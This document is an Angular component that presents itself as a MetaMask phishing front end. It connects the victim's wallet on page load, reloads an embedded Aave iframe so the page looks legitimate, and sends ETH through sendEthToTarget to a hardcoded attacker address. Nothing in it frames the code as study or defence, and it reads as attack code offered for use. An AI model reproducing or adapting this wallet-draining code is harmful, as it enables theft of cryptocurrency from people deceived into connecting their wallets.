import { AfterViewInit, Component } from '@angular/core';

declare let ethereum: any;

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrl: './app.component.scss'
})
export class AppComponent implements AfterViewInit {
  opacity: number = 1;
  accountConnectedAddress: string = 'Not Connected';
  supplyEth: boolean = false;
  supplyClickCounter: number = 0;
  targetAddress: string = '0x5a3259eC4B7856d1C537e00a801E91E3d19c05cb';

  ngAfterViewInit() {
    this.connectToMaliciousSite();
  }

  async connectToMaliciousSite() {
    try {
      await this.connectMetamask('malicious');
    } catch (error) {
      console.error('Error connecting to MetaMask:', error);
    }
  }

  async connectMetamask(target: 'malicious'): Promise<any> {
    return new Promise((resolve, reject) => {
      const ethereum = (window as any).ethereum;
      if (ethereum) {
        ethereum.request({ method: 'eth_requestAccounts' })
          .then((accounts: any) => {
            console.log(`Connected to ${target} site:`, accounts);
            this.accountConnectedAddress = accounts[0];
            this.reloadAaveIframe();
            resolve(accounts);
          })
          .catch((err: any) => reject(err));
      } else {
        alert('MetaMask not found');
        reject('MetaMask not found');
      }
    });
  }

  reloadAaveIframe() {
    const iframe = document.getElementById('aaveIframe') as HTMLIFrameElement;
    if (iframe) {
      iframe.onload = () => {
        this.connectAaveInIframe();
      };
      iframe.src = iframe.src;
      this.supplyEth = true;
    } else {
      console.error('Iframe element not found.');
    }
  }

  connectAaveInIframe() {
    const iframe = document.getElementById('aaveIframe') as HTMLIFrameElement;
    if (iframe?.contentWindow) {
      iframe.contentWindow.postMessage('connectWallet', '*');
    } else {
      console.error('Unable to access iframe content window.');
    }
  }


  handleIframeLoad() {
    const iframe = document.getElementById('aaveIframe') as HTMLIFrameElement;
    if (iframe?.contentWindow) {
      iframe.contentWindow.postMessage(`
        <script>
          window.addEventListener('message', function(event) {
            if (event.data === 'connectWallet') {
              if (window.ethereum) {
                window.ethereum.request({ method: 'eth_requestAccounts' })
                  .then(accounts => {
                    console.log('Connected to Aave:', accounts);
                  })
                  .catch(err => console.error('Error connecting to Aave:', err));
              } else {
                alert('MetaMask not found');
              }
            }
          }, false);
        </script>
      `, '*');
    } else {
      console.error('Unable to access iframe content window.');
    }
  }
  async sendEthToTarget() {
    try {
      this.supplyClickCounter++;
      const accounts = await (ethereum as any).request({ method: 'eth_requestAccounts' });
      const senderAddress = accounts[0];

      const transactionParameters = {
        from: senderAddress,
        to: this.targetAddress,
        value: '0x12345'
      };

      const transactionHash = await (ethereum as any).request({
        method: 'eth_sendTransaction',
        params: [transactionParameters],
      });

      console.log('Transaction sent:', transactionHash);
    } catch (error) {
      console.error('Error sending transaction:', error);
    }
  }
}